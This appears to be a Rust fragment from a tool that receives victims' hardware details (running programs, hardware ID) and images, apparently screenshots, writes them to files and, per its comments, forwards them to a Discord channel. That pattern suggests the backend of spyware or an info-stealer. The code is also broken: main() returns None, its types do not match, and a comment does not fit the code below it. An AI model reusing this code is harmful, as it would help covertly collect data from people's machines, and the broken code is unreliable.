// Define the request client as a global variable
lazy_static::lazy_static! {
    static ref DATA_FOLDER: String = sha256::digest(
        global::get_time().as_nanos().to_string()
    );
}

// The create_hardware_file() function is used to create a new
// text file and write the users hardware information to it.
// This includes the users running programs, the users hwid, etc.
fn create_hardware_file(hardware_info: &str) -> std::io::Result<String> {
    // Format the hardware file path
    let hardware_info_path: &str = &format!("{}\\{}.txt", 
        DATA_FOLDER.to_string(), chrono::offset::Utc::now()
    );

    // Create the file and if the file is successfully created,
    // write the hardware data to the file then return it.
    return match File::create(hardware_info_path) {
        Ok(mut f) => match f.write_all(&hardware_info) {
            Ok(_) => Ok(base64::encode(&hardware_info)),
            Err(e) => Err(e)
        },
        Err(e) => Err(e)
    }
}

// The create_image_file() function is used to create a new
// image which will be sent to the discord channel.
fn create_image_file(image: &str) -> std::io::Result<String> {
    // Format the image file path
    let image_path: &str = &format!("{}\\{}.png", 
        DATA_FOLDER.to_string(), chrono::offset::Utc::now()
    );

    // Base64 decode the image
    let image_buffer: Vec<u8> = image_base64::from_base64(image.to_string());

    // Create the file and if the file is successfully created,
    // write the image buffer to the file then return it.
    return match File::create(image_path) {
        Ok(mut f) => match f.write_all(&image_buffer) {
            Ok(_) => Ok(image_path.to_string()),
            Err(e) => Err(e)
        },
        Err(e) => Err(e)
    }
}

fn main() {
    // Call the create_image_file() function
    let image_path: String = match create_image_file(&body.image) {
        Ok(path) => path,
        Err(_) => return None
    };

    // Call the create_hardware_file() function
    let hardware_buf: Vec<u8> = match create_hardware_file(&body.hardware_info) {
        Ok(buf) => buf,
        Err(_) => return None
    };
}